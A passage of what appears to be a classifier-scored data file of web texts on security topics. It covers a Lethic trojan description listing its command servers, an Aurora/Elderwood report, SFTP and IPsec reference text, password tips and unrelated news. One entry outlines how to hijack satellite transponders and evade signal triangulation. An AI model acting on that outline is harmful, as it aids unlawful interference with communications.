antivirus program that includes a spam filter installed and up-to-date. Any of Panda Security’s solutions will protect you against these kind of threats. Aditionally, Below you will find a series of tips on how to reduce the risk of falling victim to these threats: - Check the source of information received. Don't reply to any email message that asks for your personal or financial information. - If you don’t have an antivirus, you can install any of Panda Security’s programs to give you full protection against these and other threats. - Analyze you computer for free and check out if you computer is Botnets free. Download Panda Security",
        "prob": "tensor([[2.1713e-06, 1.0000e+00]])"
    },
    {
        "text": "Get on-the-go access to the latest insights featured on our Trustworthy Computing blogs. Win32/Lethic is a trojan that communicates with a remote server to distribute spam. Variants of Lethic install executable files with varied file names such as “shelldm.exe” or “xcllsx.exe”. The malware loads as a process when Windows starts. The trojan establishes a connection to remote servers using varied TCP ports, such as 1430, 8900, 8090 and so on. It communicates with servers with names such as “dqglobex.com”, “verywellhere.cn”, “iamnothere.cn” among others. Once connected, the trojan allows unauthorized use of the affected computer, including distributing spam. Forefront Online Protection for Exchange (FOPE) consists of layered technologies to actively help protect businesses’ inbound and outbound e-mail from spam, viruses, phishing scams, and e-mail policy violations. Image 1 - Forefront Online Protection for Exchange diagram According to FOPE spam statistics, Win32/Lethic produces a high volume of spam and thus has been selected for addition this month to the Microsoft Malware Removal Tool (MSRT). Win32/Lethic is not the biggest botnet in terms of IP addresses, however, it is known for sending many messages into a single envelope. Below, you can see the difference in spam distribution models between two malware, Win32/Rustock and Win32/Lethic. Notice that in Rustock, the spam message is a 1:1 ratio where Lethic is 1:many. Image 2 – Win32/Rustock spam distribution model Image 3 – Win32/Lethic spam distribution model You can do more to protect your Internet experience by running a full AV solution, such as Microsoft Security Essentials, for real-time protection. Download and install Microsoft Security Essentials from http://www.microsoft.com/security_essentials/. Patrick Nolan, MMPC",
        "prob": "tensor([[2.0799e-06, 1.0000e+00]])"
    },
    {
        "text": "SSH File Transfer Protocol In computing, the SSH File Transfer Protocol (also Secure File Transfer Protocol, or SFTP) is a network protocol that provides file access, file transfer, and file management functionalities over any reliable data stream. It was designed by the Internet Engineering Task Force (IETF) as an extension of the Secure Shell protocol (SSH) version 2.0 to provide secure file transfer capability, but is also intended to be usable with other protocols. The IETF Internet Draft states that even though this protocol is described in the context of the SSH-2 protocol, it could be used in a number of different applications, such as secure file transfer over Transport Layer Security (TLS) and transfer of management information in VPN applications. This protocol assumes that it is run over a secure channel, such as SSH, that the server has already authenticated the client, and that the identity of the client user is available to the protocol. Compared to the earlier SCP protocol, which allows only file transfers, the SFTP protocol allows for a range of operations on remote files – it is more like a remote file system protocol. An SFTP client's extra capabilities compared to an SCP client include resuming interrupted transfers, directory listings, and remote file removal. SFTP attempts to be more platform-independent than SCP; for instance, with SCP, the expansion of wildcards specified by the client is up to the server, whereas SFTP's design avoids this problem. While SCP is most frequently implemented on Unix platforms, SFTP servers are commonly available on most platforms. The protocol itself does not provide authentication and security; it expects the underlying protocol to secure this. SFTP is most often used as subsystem of SSH protocol version 2 implementations, having been designed by the same working group. However, it is possible to run it over SSH-1 (and some implementations support this) or other data streams. Running SFTP server over SSH-1 is not platform independent as SSH-1 does not support the concept of subsystems. An SFTP client willing to connect to an SSH-1 server needs to know the path to the SFTP server binary on the server side. For uploads, the transferred files may be associated with their basic attributes, such as timestamps. This is an advantage over the common FTP protocol, which does not have provision for uploads to include the original date/timestamp attribute without help. History and development The Internet Engineering Task Force (IETF) working group \"Secsh\" that was responsible for the development of the Secure Shell version 2 protocol (RFC 4251) also attempted to draft an extension of that standard for secure file transfer functionality. Internet Drafts were created that successively revised the protocol into new versions. The software industry began to implement various versions of the protocol before the drafts were standardized. As development work progressed, the scope of the Secsh File Transfer project expanded to include file access and file management. Eventually, development stalled as some committee members began to view SFTP as a file system protocol, not just a file access or file transfer protocol, which places it beyond the purview of the working group. Versions 0 - 2 Prior to the IETF's involvement, SFTP was a proprietary protocol of SSH Communications Security, designed by Tatu Ylönen with assistance from Sami Lehtinen in 1997. Differences between versions 0 - 2 and version 3 are enumerated upon in section 10 of draft-ietf-secsh-filexfer-02. Version 3 At the outset of the IETF Secure Shell File Transfer project, the Secsh group stated that its objective of SSH File Transfer Protocol was to provide a secure file transfer functionality over any reliable data stream, and to be the standard file transfer protocol for use with the SSH-2 protocol. Drafts 00 - 02 of the IETF Internet Draft define successive revisions of version 3 of the SFTP protocol. - SSH File Transfer Protocol, Draft 00, January 2001 - SSH File Transfer Protocol, Draft 01, March 2001 - SSH File Transfer Protocol, Draft 02, October 2001 Version 4 Drafts 03 - 04 of the IETF Internet Draft define version 4 of the protocol. - SSH File Transfer Protocol, Draft 03, October 2002 - SSH File Transfer Protocol, Draft 04, December 2002 Version 5 Draft 05 of the IETF Internet Draft defines version 5 of the protocol. Version 6 Drafts 06 - 13 of the IETF Internet Draft define successive revisions of version 6 of the protocol. - SSH File Transfer Protocol, Draft 06, October 2004 - SSH File Transfer Protocol, Draft 07, March 2005 - SSH File Transfer Protocol, Draft 08, April 2005 - SSH File Transfer Protocol, Draft 09, June 2005 - SSH File Transfer Protocol, Draft 10, June 2005 - SSH File Transfer Protocol, Draft 11, January 2006 - SSH File Transfer Protocol, Draft 12, January 2006 - SSH File Transfer Protocol, Draft 13, July 2006 SFTP client The term SFTP can also refer to Secure file transfer program, a command-line program that implements the client part of this protocol. As an example, the sftp program supplied with OpenSSH implements this. Some implementations of the scp program support both the SFTP and SCP protocols to perform file transfers, depending on what the server supports. SFTP server There are numerous SFTP server implementations both for UNIX, Windows and z/OS. The most widely known is perhaps OpenSSH, but there are also proprietary implementations. Typically the port used is 22. SFTP file transfer protocol is part of SSH protocol suite. SFTP proxy It is difficult to control SFTP transfers on security devices at the network perimeter. There are standard tools for logging FTP transactions, like TIS fwtk or SUSE FTP proxy, but SFTP is encrypted, rendering traditional proxies ineffective for controlling SFTP traffic. There are some tools that implement man-in-the-middle for SSH which also feature SFTP control. Examples of these tools include Shell Control Box from Balabit and FileGate SFP from Presaris. These provide functions such as SFTP transaction logging and logging of the actual data transmitted on the wire. See also - SSH Communications Security - Comparison of SSH servers - Comparison of SSH clients - AbsoluteTelnet - SSH client that includes a GUI SFTP client for file transfer. - SSHFS - Mounting remote filesystem using SFTP and SSH - Category:FTP clients - Category:SFTP clients - Lsh - A GNU SSH-2 and SFTP server for Unix-like OSes - List of file transfer protocols - Barrett, Daniel; Richard E. Silverman (2001), SSH, The Secure Shell: The Definitive Guide, Cambridge: O'Reilly, ISBN 0-596-00011-1 - \"Secsh Status Pages\". Tools.ietf.org. Retrieved 2012-08-20. - \"ietf.secsh - Formal consultation prior to closing the secsh working group - msg#00010 - Recent Discussion\". Osdir.com. 2006-08-14. Retrieved 2012-08-20. - \"OpenBSD \"man\" page for the \"sftp\" command: \"See Also\" section\". OpenBSD.org. Retrieved 2012-12-27. - \"Record SSH/RDP/Citrix into Audit Trail - Activity Monitoring Device\". Balabit.com. Retrieved 2012-08-20. - \"FileGate\". Presaris. Retrieved 2012-08-20. - Chrooted SFTP with Public Key Authentication – Integrating SFTP into FreeBSD production servers using the public key cryptography approach",
        "prob": "tensor([[0.0017, 0.9983]])"
    },
    {
        "text": "First, I learned a lot of my information from a combination of my amateur radio experience and an awesome talk I sat in at DEFCON 18. The majority of satellite systems are simple repeaters. The signal that comes in on a transponder is cleaned, amplified, and retransmitted. If you know the location and input frequency, and you pump more effective radiated power than anybody else, you win. Many satellites also require command modules. These are used to interpret instructions to boost back into orbit or at the end of life, de-orbit into a \"graveyard\" pattern (or right into the atmosphere itself). Because most satellite systems are custom, it is a real crapshoot what you see for commands and security. I suspect that most command sequences are unencrypted and rely on the fact that a MITM attack on something in space is fairly hard. Frequencies vary wildly from MHz to several tens of GHz. Your equipment needs to put out the right frequency through a dish that is the right size. Legally speaking, you will at a minimum foul the FCC or your national equivalent, by violating regulations on licensed broadcasting. Also, \"birds\" and airtime are expensive, so the civil liability if found can be bankrupting. As far as taking a satellite transponder over is concerned, security relies on rarity of attacks, detection, and triangulation of the signal source. Then people come knocking on your door. Finding a bird First, you've got to have a target. Some satellites are geostationary, so they're easy. Other satellites have orbits that sending them in offset patterns around the world. The satellite will come into view at different elevations in the sky tracing different paths, so you'll need to know where it will be and how it will move in order to communicate. Communications satellites tend to either be geostationary or part of a cluster of many satellites such that one or more is always in view of at least one ground station and any other point on the planet. There are websites all over the place for this, and they often end up with military / disavowed satellites listed as people will track them with a telescope and then wonder why that one isn't listed yet. Talking to a bird: Bands Satellites operate on different frequencies, and the antenna used has to be sized to the frequency of the satellite. Most satellites operate in the microwave spectrum. The ubiquitous (in the United States) DirecTV / Dish Network antennas are usually on the higher end (smaller wavelength) of the spectrum. Because your signal has a lot of travel in its future and your target is small, your goal is to direct as much power in one direction as possible. Anything sent off to the sides, earth, etc. is wasted energy, so you will want an appropriately-sized high-gain antenna. Antenna design can be learned from amateur radio books on the topic. Before someone chimes in and says, \"You don't NEED a directional antenna and tracking motor,\" that's true... but it will help a hell of a lot. Just because your spot messenger or GPS doesn't have one doesn't mean you shouldn't use one if you can. It will keep your signal where you want it and limit the possibility of interference from or with other things using the same frequency. It also means that it will be harder for somebody to hunt you down. Being nicked just because you let strangers hear you might have some costs associated. Talking to a bird: Protocol Now we're getting a bit trickier. Some satellites are very simple, particularly amateur radio satellites. They receive a signal and they transmit that signal back. There are different variations of protocol, polarisation, modulation (QAM is a good one to understand), etc. If your target does more cleanup than just setting a noise floor and spitting things back out, you'll need to know that information as well. Higher-level protocols may be standard IP/TCP, plaintext, encrypted, or some totally imaginary 17 bit codeword system that was dreamed up by a guy like Mel. You need to deliver more power to the right place with the appropriate protocol. Because almost every satellite is a custom design, that's challenging. If you goal is beyond simple re-broadcast, you're up against a big black box every time. Computers are small, low-power, and probably have next to nothing on them. The best bet for MITM If you can't afford to launch your own satellite, figure out where the ground station is and fly over it. Small aircraft are relatively cheap to rent (under $100 / hour to operate), tethered balloons may get high enough to have an effective angle, and if you're quite sneaky you can put something on the transmitter feed line itself. Many smaller organizations rent their satellite time. I learned when I was 11 that the guy running the local news station's satellite truck is bored as hell when they're in between shots and will definitely show you all the cool things about his rig. Whatever he's renting is probably one of the easier things to get at because that has to be documented and relatively easy to work with.",
        "prob": "tensor([[0.2082, 0.7918]])"
    },
    {
        "text": "(Translated from the original Italian) Today I desire to discuss on the real effect of a cyber attack, we have recently introduced the direct and indirect effects of the several cyber espionage campaigns discovered such as Flame and Gauss, but we never approached the problem in future projection examining the possible impacts of an incident many years after it. Symantec researchers published an analysis that demonstrate the link between a series of attacks to more than 30 companies and the cyber espionage attacks moved against Google three years ago so-called Operation Aurora. Operation Aurora is considered an epical cyber attack which happened during second half of 2009 and publicly disclosed by Google on January 2010. The sophisticated attacks appeared to be originated in China and aimed at dozens of other organizations who were hit, of which Adobe Systems and Juniper Networks confirmed the incident. The press is also convinced that other companies were targeted such as Morgan Stanley, Northrop Grumman and Yahoo. Aurora attack is one of the most complex operation due the capability of attacker to exploit several 0-day vulnerabilities included one related the popular IE Explorer, in 2010 a notable zero-day exploit was linked to the group of hackers that used a Trojan horse called \"Aurora\" diffused using an Internet Explorer (IE) zero-day, and targeted a large number of Western companies. According the security firm Symantec the hackers behind the attacks still have knowledge of 0-day vulnerabilities, and at least four of them have been used in recent attacks against different targets across strategic sectors such as energy, defense, aeronautics and financial. Orla Cox, senior manager at Symantec's security response division reported that it has been exploited at least eight zero-day vulnerabilities since late 2010, and four since last spring. She said: \"We were amazed when Stuxnet used four zero-days, but this group has been able to discover eight zero-days. More, the fact that they have prepared [their attacks] and are ready to go as soon as they have a new zero-day, and the speed with which they use these zero-days, is something we've not seen before.\" The document of security firm reports: \"This group is focused on wholesale theft of intellectual property and clearly has the resources, in terms of manpower, funding, and technical skills, required to implement this task,\" \"The group seemingly has an unlimited supply of zero-day vulnerabilities.\" The attacks part of the cyber espionage campaign discovered by Symantec has been named \"Elderwood Project\", for their execution have been exploited 0-day vulnerabilities in many large-use software including IExplorer and Adobe Flash Player. The experts from Symantec declared that some of the exploits have been realized from the knowledge of stolen source code. \"In order to discover these vulnerabilities, a large undertaking would be required by the attackers to thoroughly reverse-engineer the compiled application,\" \"This effort would be substantially reduced if they had access to source code. The group seemingly has an unlimited supply of zero-day vulnerabilities. The vulnerabilities are used as needed, often within close succession of each other if exposure of the currently used vulnerability is imminent.\" The attacks conducted during the recent months have been using an unusual method to infect the victims with a malware, it has been named \"watering hole\" attack and consists to inject malicious code onto the public Web pages of a site that the targets use to visit. The method of injection isn't new and is commonly used by cyber criminals and hackers, the main difference between their use in cybercrime and in watering hole attacks is related to the choice of websites to compromise and use in the attacks. The attackers haven't indiscriminately compromised any website but they are focused chhosing websites within a particular sector so as to infect persons of interest who likely work in that same sector and are likely to therefore visit related websites. The Symantec report states: \"Targeting a specific website is much more difficult than merely locating websites that contain a vulnerability. The attacker has to research and probe for a weakness on the chosen website. Indeed, in watering hole attacks, the attackers may compromise a website months before they actually use it in an attack. Once compromised, the attackers periodically connect to the website to ensure that they still have access. This way, the attackers can infect a number of websites in one stroke, thus preserving the value of their zero-day exploit. They are even in a position to inspect the website logs to identify any potential victims of interest. This technique ensures that they obtain the maximum return for their valuable zero-day exploit.\" Once a victim visits the compromised site, the software for which the 0-days have been designed will make possible the infection of the machine. Symantec researcher have detected the use of this method using at least three different zero-day exploits in the last month. The researchers believe that a specific platform has been implemented to conduct the operations, all the attacks use a Trojan to infect the target computer that is packaged with a packer and also the address of the command-and-control (C&C) server. The delivery of the malware to the final victim is either though an email or a Web based vector. I opened the post supporting the idea that Aurora attacks are state sponsored, it's clear that I have no evidences for this, but the nature of the job made, the targets chosen and the complexity of the operations make me believe that it is a result of a government project. The unique certainty according Symantec is a connection between the most recent attacks and those used in attacks in 2011, demonstrable with common technical features and a noticeable similarity in the timing of the attacks and the types of vulnerabilities used between the 2012 and 2011 attacks. \"After this initial compromise, the attackers consolidate their beachhead and begin to analyze the stolen information, spreading through networks and maintaining access as needed. By analyzing the information gathered, the attackers can identify yet more targets of interest\" Cox said Symantec has no hard evidence of this: \"But this is a full-time job,\" \"The work they do is both skilled and time consuming. They would have to work at it full time, so someone is paying them to do this.\" \"The analysis has shown that certain organizations have been hit in different ways, indicating that they're of particular interest to [their paymasters],\" I leave you all the interpretations of Symantec expert, but I think that her thought is not far from mine. Waiting for further analysis any manufacturers who are in the defense supply chain need to be wary of these type of attacks. Subsidiaries, business partners, and associated companies are considerable priviledged targets, an easy way to break penetrate defense system of large companies ... raise your guard the enemy may already be in. Cross-posted from Security Affairs",
        "prob": "tensor([[2.0965e-06, 1.0000e+00]])"
    },
    {
        "text": "Is your New Computer Safe? While recently investigating counterfeit versions of the Windows operating system, Microsoft uncovered a security threat involving pre-loaded malware. The counterfeit operating systems and malware were found on brand-new computers manufactured and sold in China. The discovery further lead to a server hosting 500 different pieces of malware including Nitol. Some of the malicious code found are capable of keystroke logging, denial-of-service attacks, rootkits, backdoors and more. Nitol is a program that creates a \"bot\" on a user's computer which connects to a network center or a \"botnet.\" There, hackers can subvert the infected computer to do their biding by issuing commands remotely. Nitol is capable of launching DDoS attacks against targets, or opening backdoors for additional malware infections or activity monitoring by turning on a microphone or video camera on a computer. Yesterday the US Cybersecurity Act of 2012 — a bill that would have given the government more access to monitor our private communications and data — met defeat. As of now, SOPA, HR 1981, and the Cybersecurity Act of 2012 have all been voted down. Certainly more bills will foisted on the Internet community in the future. We'll keep you posted! SOPA and PIPA Most internet users have heard of this proposed legislation by now. Many websites such as Wiki are protesting this legislation today by blacking out their website or otherwise letting their users know about it. Americans should not have to tolerate this type of censorship. I encourage you to take action and to encourage others to do the same. The entertainment industry and others concerned about online piracy should use their own legal and technical resources to resolve the matter. Online piracy is only one of many problems caused by the internet. The entertainment industry argues that it looses $30-$40 Billion to online piracy. Various groups argue that the loses are exaggerated and estimates the loses to be around $445 Million. Regardless of which figure you agree with, studies have shown that Unsolicited Bulk E-mail (SPAM) costs internet providers and employers $70 Billion annually. Other issues such as identity theft and security should be paramount ahead of the entertainment industry's profit. If you are unaware of what SOPA and PIPA are, please take a moment to familiarize yourself with the controversy. More information can be found in the links below.Wikipedia, Google and others have provided convenient tools to locate quickly contact our representatives. Please take a moment of your time to let them know that our Freedom is important and SOPA and PIPA should not be passed. CEO, Starpoint Communications, Inc. Freedom Wins - SOPA/PIPA Update From the Associated Press:Senate Majority Leader Harry Reid announced today that he is postponing Tuesday's procedural vote on the Protect IP Act (PIPA). Meanwhile, House Judiciary Committee Chairman Lamar Smith said his committee is postponing consideration of PIPA's House companion, the Stop Online Piracy Act (SOPA), \"until there is wider agreement on a solution.\" Are Anti-Virus Programs Worth It? Regardless of the antivirus program you use, it will impact your computer's performance. Some more some less. Even programs which incur annual subscription fees are not always cost effective when you consider how much they slow down your computer. For many years we've recommended AVG and for the most part still do. There are a number of excellent antivirus programs that are free and do a terrific job. We would also like to let our user's know about the Microsoft Security Essentials (MSE). This is a complete anti-malware package available from Microsoft itself. So, if you are running windows XP (or newer) and your $50 copy of Norton or McAfee is about to expire, consider uninstalling it and using the MSE software.",
        "prob": "tensor([[2.1490e-06, 1.0000e+00]])"
    },
    {
        "text": "In the November issue of The Atlantic, James Fallows shares the disturbing story of what happened when his wife’s Gmail account got hacked earlier this year. First, she couldn’t log into her account. Then, her contacts received a troubling message that she was stranded in Madrid with no money, and she needed them to wire her funds, immediately. (It might sound like a scam, but many recipients were concerned enough to contact her husband.) Soon, she had no access to her account and all her messages—years’ worth—had been deleted. [In Pictures: 10 Ways to Start Earning Extra Money Now] Fallows and his wife, Deb, followed Gmail’s instructions on recovering a compromised account, and eventually regained access, but they were unable to recover her old emails until Google executives got involved. (Before James Fallows called on his own contacts, who happened to be high-level executives in the company, Google had declined to help them further.) Fallows uses the experience to show just how easy it is for hackers to break into emails and wreak all kinds of havoc on victims’ professional, financial, and personal lives. The Federal Trade Commission reports that 9 million Americans experience some form of identity theft each year, but there are steps people can take to reduce the risk of it happening to them. When it comes to email protection, Fallows suggests the following: 1. Do not use the same password on multiple sites. Fallows equates this to simply not using a password at all. If you use your email password on less secure sites that also use your email address as a login name, you are essentially telling a less-secure site how to log into your account. 2. Avoid common words or names. Hackers can simply guess these words, says Fallows, so they don’t offer much protection from attacks. 3. If you use Gmail, implement the two-step verification system, which means that when you log into your account from any device that is not your normal computer, you need to enter a numerical code that Google sends to your phone. (On computers you use regularly, you only need to enter a code every 30 days.) You also enter a unique code on mobile devices, such as smartphones. Fallows says this system stops almost all attacks, since the hacker would need to have your cell phone as well as your password. 4. Create a long password that only you know. Fallows’ examples include “Lake Winnebago is deep and chilly,” and “my favorite packer is not brett favre.” Those passwords are so long that a hacker would have a hard time guessing it. [In Pictures: 10 Ways to Save on Food Costs] Here are four more tips from the identity protection services firm myID.com: 1. Stay away from any personal information, such as birthdays, sports teams, or children’s names. Anyone who knows you personally—or can find such information about you through social networking sites—will be able to make a reasonable guess at your password. 2. Use those old elementary school memory tricks. If you want an easy way to remember a complicated password, try making up a sentence about it. For example, “I love my dog Harry so much” can translate into the hard-to-guess password ILMDHSM.” 3. Change passwords as often as you change your air conditioning filter. That’s about once a month for online financial accounts. Other accounts should be changed every three to four months, says myID.com. 4. Don’t share. Keep passwords to yourself and try to avoid storing them on your computer or smartphone, where others could see them, including hackers. MyID.com says they belong in your head or a locked safe. Do you have any tips on keeping your passwords safe?",
        "prob": "tensor([[2.1398e-06, 1.0000e+00]])"
    },
    {
        "text": "Net neutrality may become federal election issue in Canada With the federal election in full swing, Lindsey Pinto is ramping up the fight for an accessible and open Internet. The communications manager for the Vancouver-based group OpenMedia.ca said Canadians need to be aware of the importance of net neutrality. “We have some of the strongest net-neutrality regulations in the world, and we do not enforce them at all,” Pinto told the Georgia Straight by phone. Net neutrality is the idea that the Internet should be a level playing field for all users. According to this principle, Internet service providers shouldn’t discriminate against applications or websites based on their content or other reasons. Whether it’s a blog about cats, a newspaper website, or peer-to-peer file-sharing, net neutrality says telecommunications companies shouldn’t be able to selectively block, speed up, or slow down access to this content. “The Internet is our best source for democratic discourse,” Pinto said. “If Internet service providers can throttle content and give preferential treatment to content that they own or that they make deals with, it is going to stifle that innovation and prevent our economy growing in that capacity.” This week, OpenMedia launched a campaign called Vote for the Internet. The group is encouraging voters to write to their local candidates and plans to survey party leaders about their positions on the Internet’s future. OpenMedia has been at the forefront on digital issues such as net neutrality and usage-based billing for Internet service. The group says telecom companies are not playing by bandwidth-throttling rules put in place by the Canadian Radio-television and Telecommunications Commission in 2009. Under CRTC regulations, users who notice their Internet connections are being sped up or slowed down can file a complaint with the regulatory body. The CRTC will then investigate to see if the complaint is credible. If the complaint is valid, the CRTC will then ask the ISP for information about their traffic-management practices. According to Pinto, this regulatory regime puts the onus on consumers to investigate problems with the complex networks run by telecom companies. She argued there is a better way to police net neutrality. “We have been pushing for some time that the CRTC do audits of Internet service providers to make sure that they are complying with these traffic-management rules,” Pinto said. “So, essentially asking them to enforce their own framework.” University of Ottawa law professor Michael Geist runs Neutrality.ca, a website that chronicles the constant battle for net neutrality with telecom giants like Rogers, Bell, and Telus. He asserts the CRTC’s regulations are ineffective without proper enforcement. “I would like to see the industry minister in particular use their office to find ways to conduct audits and provide either the resources or the direction to make sure that sort of thing happens,” Geist told the Straight by phone from Ottawa. “While the [regulations] are pretty good, it ultimately falls onto individual Canadians to investigate and bring complaints. I think, given the lack of transparency in how networks run, that is a very tall order for most individual Canadians to do.” Conservative industry minister Tony Clement’s staff said he was unavailable for an interview. But in the past, the Conservative party has said it does not support compliance audits and it believes the CRTC’s enforcement strategy is working. Meanwhile, the federal NDP and Liberal parties both support mandatory net-neutrality audits by the CRTC to ensure that Internet providers obey the commission’s traffic-management guidelines. Geist said there is another way to ensure Canadian ISPs are allowing unrestricted access of the web, arguing more competition between telecom companies would translate into an open and accessible Internet. “Other countries in Asia and Europe—where they have got net-neutrality rules—in some ways, they have got enough competition that it is less of a concern,” Geist said. Telecom giant Rogers said that having the CRTC or the government perform mandatory inspections on their traffic-management systems is not necessary. “We regularly audit our technology,” Rogers spokesperson Patricia Trott told the Straight by phone from Toronto. In January, the CRTC said it had received a number of complaints alleging the company was throttling traffic of peer-to-peer websites to some of its customers without providing 30 days notice. Trott said Rogers monitors and limits upstream traffic to limit spam, viruses, and security threats. “Rogers does manage upstream traffic for peer-to-peer file sharing applications. So, say if you were downloading a movie you wouldn’t notice anything different in the speed at all,” Trott said. “It is just for the upstream that we actually slow it down. And that’s because it takes up a lot of room, and we want to make sure our customers’ services like e-mail and other things are not slowed down,” she added. Trott insisted Rogers is transparent about its traffic-management practices, posting its policies on its website. “Our customers have access to all over-the-top services, all Internet websites, and so on.”¦We recognize that our customers want to have access to all of the content that they want and so that is what we want to provide them,” Trott said. Still, Pinto argued ISPs shouldn’t be controlling how people use the web. She’s urging Canadians to vote for candidates who support strong net-neutrality regulations. “We need to have these rules in place,” Pinto said. “These big companies, they are as monolithic as governments are. And they are as threatening as government control is.”",
        "prob": "tensor([[0.0019, 0.9981]])"
    },
    {
        "text": "Facebook is reportedly testing out controls that would allow users under the age of 13 to participate on the social network under parental supervision. Citing people who have spoken with Facebook executives about the project, WSJ.com reports mechanisms in testing include “connecting children's accounts to their parents' and controls that would allow parents to decide whom their kids can ‘friend’ and what applications they can use.” Facebook has been put in the awkward position of having to consider allowing underaged users because so many currently lie about their age and are using the network anyway. However, it’s not all altruism or damage control; one mechanism they’re trying on would reportedly allow for parents to pay for games or apps their children access through Facebook. Revenue is clearly, at the very least, a secondary driver. Last June, Consumer Reports magazine said they had unearthed “several disturbing findings” about children and Facebook, including: - 20 million minors had used Facebook within the year prior to their study. - 7.5 million of those users were under the age of 13 and not permitted to use the site. - 5 million of those were 10 years old or younger. - 1 million children had been harassed, threatened, or subjected to other forms of cyberbullying in the year prior. At the time, Federal Trade Commission chair Jon Leibowitz told Consumer Reports, “We are very concerned about kids eliding around COPPA’s restrictions.” COPPA is the Federal Children’s Online Privacy Protection Act of 1998, which prohibits sites from knowingly disclosing children’s personally identifiable information. Facebook safety monitoring tool company Minor Monitor reports even scarier trends in their infographic based on a survey of 1,000 American parents (see above). According to their research, 4 percent of children on Facebook are 6 years old or younger. Among parent concerns about their children using Facebook, 56 percent are worried about sexual predators, 49 percent fear their kids will share too much personal information, and 45 percent are afraid their children will connect with strangers. Surprisingly, 17 percent of these parents still don't monitor their child’s Facebook activity at all. Web community Sodahead surveyed 2,000 users back in March to learn whether parents are happy with Facebook’s current minimum age requirement. Forty-eight percent of parent respondents said 13 years old is just too young to use Facebook and felt the minimum age should be increased. Opinions varied widely though; 5 percent said 7- to 9-year-olds should be allowed. Lawmakers are already expressing concern. What do you think of Facebook opening the floodgates to users of all ages and what controls do you think they need to have in place to make it work? Let us know in the comments. JUNE SALE! Save 15%* Save on all e-learning certification courses, including: SEO, Social Media, Online Marketing Foundation, Web Analytics and more. Enter CZAJU at checkout » Offer expires June 30. *Discount not applicable on SES Online products.",
        "prob": "tensor([[0.0108, 0.9892]])"
    },
    {
        "text": "Editor's Note: This article was originally presented at ESC Boston 2011. No software engineering process can guarantee secure code, but following the right coding guidelines can dramatically increase the security and reliability of your code. Many embedded systems live in a world where a security breach can be catastrophic. Embedded systems control much of the world’s critical infrastructure, such as dams, traffic signals, and air traffic control. These systems are increasingly communicating together using COTS networking and in many cases using the Internet itself. Keeping yourself out of the courtroom, if not common decency, demands that all such systems should be developed to be secure. There are many factors that determine the security of an embedded system. A well-conceived design is crucial to the success of a project. Also, a team needs to pay attention to its development process. There are many different models of how software development ought to be done, and it is prudent to choose one that makes sense. Finally, the choice of operating system can mean the difference between a project that works well in the lab and one that works reliably for years in the real world. Even the most well thought-out design is vulnerable to flaws when the implementation falls short of the design. This paper focuses on how one can use a set of coding guidelines, called MISRA C and MISRA C++, to help root out bugs introduced during the coding stage.MISRA C and C++ MISRA stands for Motor Industry Software Reliability Association. It originally published Guidelines For the Use of the C Language In Critical Systems , known informally as MISRA C, in 1998. A second edition of MISRA C was introduced in 2004, and then MISRA C++ was released in 2008. More information on MISRA and the standards themselves can be obtained from the MISRA website The purpose of MISRA C and MISRA C++ guidelines are not to promote the use of C or C++ in critical systems. Rather, the guidelines accept that these languages are being used for an increasing number of projects. The guidelines discuss general problems in software engineering and note that C and C++ do not have as much error checking as other languages do. Thus the guidelines hope to make C and C++ safer to use, although they do not endorse MISRA C or MISRA C++ over other languages. MISRA C is a subset of the C language. In particular, it is based on the ISO/IEC 9899:1990 C standard, which is identical to the ANSI X3.159-1989 standard, often called C ’89. Thus every MISRA C program is a valid C program. The MISRA C subset is defined by 141 rules that constrain the C language. Correspondingly, MISRA C++ is a subset of the ISO/IEC 14882:2003 C++ standard. MISRA C++ is based on 228 rules, many of which are refinements of the MISRA C rules to deal with the additional realities of C++. For notational convenience, we will use the terms “MISRA”, “MISRA C” or “MISRA C++” loosely in the remainder of the document to refer to either the defining documents or the language subsets.",
        "prob": "tensor([[0.0284, 0.9716]])"
    },
    {
        "text": "IPSEC also has the disadvantage of requiring operating system support, since most O/S kernels don't allow direct manipulation of IP headers. This presents legal issues, since cryptographic software is restricted by many governments. Linux IPSEC support (the FreeS/WAN project), for example, isn't included in the standard kernel distribution for this reason, and has to be applied as an add-on. Furthermore, putting the cryptography in the kernel isolates it from the application, making it more difficult to code crypto-aware software. Using SSL, for example, simply requires linking a library into the application and allows the application to easily query what certificates have been used to authenticate a client (for example). Doing the same thing with IPSEC requires the application to query the kernel using some kind of API. Figure 1. IPsec Document Roadmap IPSEC defines a \"Security Association\" (SA) as its primitive means of protecting IP packets. An SA is defined by the packet's destination IP address and a 32-bit Security Parameter Index (SPI), that functions somewhat like a TCP or UDP port number, in that it allows multiple SAs to a single destination address. SAs can operate in transport mode, where the IPSEC data field begins with upper level packet headers (usually TCP, UDP, or ICMP), or in tunnel mode, where the IPSEC data field begins with an entirely new IP packet header, ala RFC 2003. Furthermore, SAs can be encapsulated within SAs, forming SA bundles, allowing layered IPSEC protection. For example, one SA might protect all traffic through a gateway, while another SA would protect all traffic to a particular host. The packets finally routed across the network would be encapsulated in an SA bundle consisting of both SAs. The other side of the connection could be identical in design, consisting of a gateway implementing a tunnel SA, followed by a host implementing a transport SA, or the entire bundle could be terminated in a single host, which would then implement both SAs. Figure 2: Bundled SAs A common use of IPSEC is the construction of a Virtual Private Network (VPN), where multiple segments of a private network are linked over a public network using encrypted tunnels. This allows applications on the private network to communicate securely without any local cryptographic support, since the VPN routers perform the encryption and decryption. IPSEC is well suited for this environment, more so than tunneling PPP over SSL or SSH, since it operates directly on the IP packets and preserves a one-to-one correspondence between packets inside and outside the network. In the case of tunneling PPP over an encrypted TCP connection, any packet loss in the public network would trigger a TCP retransmission, stalling the link until the packet was delivered. In particular, running Voice Over IP (VoIP) traffic through a TCP/PPP tunnel would largely defeat the RTP protocol used for VoIP; IPSEC is better suited in this case.",
        "prob": "tensor([[6.0740e-04, 9.9939e-01]])"
    },
    {
